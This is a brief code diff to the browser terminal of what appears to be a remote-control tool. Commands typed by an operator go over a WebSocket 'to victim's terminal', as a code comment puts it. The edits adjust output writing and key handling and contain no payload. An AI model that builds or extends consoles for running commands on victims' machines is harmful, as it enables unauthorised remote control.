@@ -31,7 +31,7 @@
 
     webSocket.onmessage = function(e) {
         const data = JSON.parse(e.data);
-        term.writeln(data.message);
+        term.write(data.message);
     };
 
     webSocket.onclose = function(e) {
@@ -66,6 +66,7 @@
 
             if (e.domEvent.keyCode === 39) {
                 if (cursor < command.length) {
+                    term.prompt();
                     term.write(e.key);
                     cursor += 1;
                 }
@@ -134,7 +135,7 @@
         term.write('$ ');
       }
       else {
-        term.prompt()
+        term.prompt();
         // Send command to victim's terminal via websocket.
         webSocket.send(JSON.stringify({
               'message': command
